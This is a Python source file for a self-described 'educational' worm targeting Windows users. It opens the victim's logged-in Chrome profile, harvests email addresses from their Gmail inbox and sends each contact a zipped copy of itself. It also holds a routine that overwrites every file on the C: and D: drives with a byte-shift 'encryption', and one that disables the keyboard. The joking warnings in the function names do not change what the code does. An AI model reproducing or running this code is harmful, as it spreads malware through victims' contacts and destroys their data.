
from selenium import webdriver
import os
import shutil
from chromedriver_py import binary_path
import time
import autoit
import keyboard

file_path = os.getcwd()
file_path = file_path.split('\\')
user = file_path[2]


def never_ever_use_this_spreading_mechanism():
    subject = "this is a virus don't open"
    text = "this is a worm created for educational purposes only. do not download the files. by downloading, " \
           "you consent to take any responsibility for damages caused by this malware to you or any other person"

    driver = open_chrome()
    print("opened browser")
    file_path = os.getcwd()
    print("got file path")
    print("created app")
    dst = fr"C:\Users\{user}\Desktop\breh"
    os.makedirs(dst)
    print("made dir: " + dst)
    shutil.copy(file_path + "\main.py", dst)
    shutil.make_archive("package", 'zip', dst)
    for i in get_victims(driver):
        send_gmail(i, subject, text, driver)


def no_dup(lst):
    new_lst = []
    for i in lst:
        if not (i in new_lst):
            new_lst.append(i)
    return new_lst


def open_chrome():
    options = webdriver.ChromeOptions()
    options.add_argument(fr"user-data-dir=C:\Users\{user}\AppData\Local\Google\Chrome\User Data")
    driver = webdriver.Chrome(chrome_options=options, executable_path=binary_path)
    driver.get("https://mail.google.com/mail/u/0/?ogbl#inbox")
    return driver


def get_victims(driver):
    email_lst = []
    element_lst = driver.find_elements_by_class_name("yP")
    for i in element_lst:
        email_lst.append(i.get_attribute("email"))
    return no_dup(email_lst)


def send_gmail(to, subject, msg, driver):
    elem = driver.find_element_by_xpath('//div[@class="T-I T-I-KE L3"]')
    elem.click()
    time.sleep(1)
    element = driver.find_element_by_name("to")
    type_slowly_to_element(to, element)
    time.sleep(1)
    element = driver.find_element_by_name("subjectbox")
    type_slowly_to_element(subject, element)
    time.sleep(1)
    elem = driver.find_element_by_xpath('//div[@class="Am Al editable LW-avf tS-tW"]')
    type_slowly_to_element(msg, elem)
    time.sleep(1)

    elem = driver.find_element_by_xpath('//div[@class="a1 aaA aMZ"]')
    elem.click()
    print("opened shit")
    time.sleep(1)
    autoit.win_active("Open")
    time.sleep(1)
    autoit.control_set_text("Open", "Edit1", os.getcwd() + r"\package.zip")
    time.sleep(1)
    print("added the file")
    autoit.control_send("Open", "Edit1", "{ENTER}")
    time.sleep(1)
    print("sent file")
    time.sleep(15)

    elem = driver.find_element_by_xpath('//div[@class="T-I J-J5-Ji aoO v7 T-I-atl L3 T-I-KL"]')  # sending messege
    time.sleep(1)
    print("found send button")
    elem.click()
    time.sleep(3)
    print("sent")


# def paste(driver, elem):
#     actions = ActionChains(driver)
#     actions.move_to_element(elem)
#     actions.click(elem)  # select the element where to paste text
#     actions.key_down(Keys.CONTROL)
#     actions.key_down('v')
#     actions.key_up('v')
#     actions.key_up(Keys.CONTROL)
#     actions.perform()


# def paste_kb():
    # pyautogui.keyDown('Ctrl')
    # pyautogui.press('v')
    # pyautogui.keyUp('Ctrl')
    # pyautogui.hotkey('ctrl', 'v')
    # kb.press('ctrl')
    # kb.press('v')
    # kb.release('v')
    # kb.release('ctrl')


def type_slowly_to_element(msg, element):
    for i in msg:
        element.send_keys(i)
        time.sleep(0.07)


# def file_to_clipboard(path, app):
#     print("start copy")
#     print("created app")
#     data = QtCore.QMimeData()
#     url = QtCore.QUrl.fromLocalFile(path)
#     data.setUrls([url])
#
#     cb = app.clipboard()
#     cb.clear()
#     cb.setMimeData(data)
#     print("deleting app")
#
#     print("app deleted")

def get_files_in_path(path):
    file_list = []
    for root, dirs, files in os.walk(path):
        for file in files:
            # append the file name to the list
            file_list.append(os.path.join(root, file))
    return file_list


def encrypt_file(path, simple_key):
    sk_len = len(simple_key)

    if path == os.getcwd():
        return

    # read file and get its content
    file = open(path, 'rb')
    file_content = file.read()
    print(file_content)
    file.close()

    # encrypt file content
    new_file_content = ''
    for i in range(0, len(file_content)):
        new_file_content += chr((file_content[i] + simple_key[i % sk_len]) % 1114111)

    # swap original content with encrypted one
    file = open(path, 'wb')
    file.write(bytes(new_file_content, encoding='utf8'))
    file.close()


def dont_fucking_use_this_encrypt_all_files():
    for i in get_files_in_path("C:"+"\\"):
        try:
            encrypt_file(i, [1])
        except Exception as e:
            print(e)

    for i in get_files_in_path("D:"+"\\"):
        try:
            encrypt_file(i, [1])
        except Exception as e:
            print(e)


def do_not_fucking_call_this_keyboard_disable():
    for i in range(150):
        keyboard.block_key(i)


if __name__ == "__main__":
    driver = open_chrome()
    print(get_victims(driver))
    send_gmail("eilon.ko@gmail.com", "test", "test", driver)
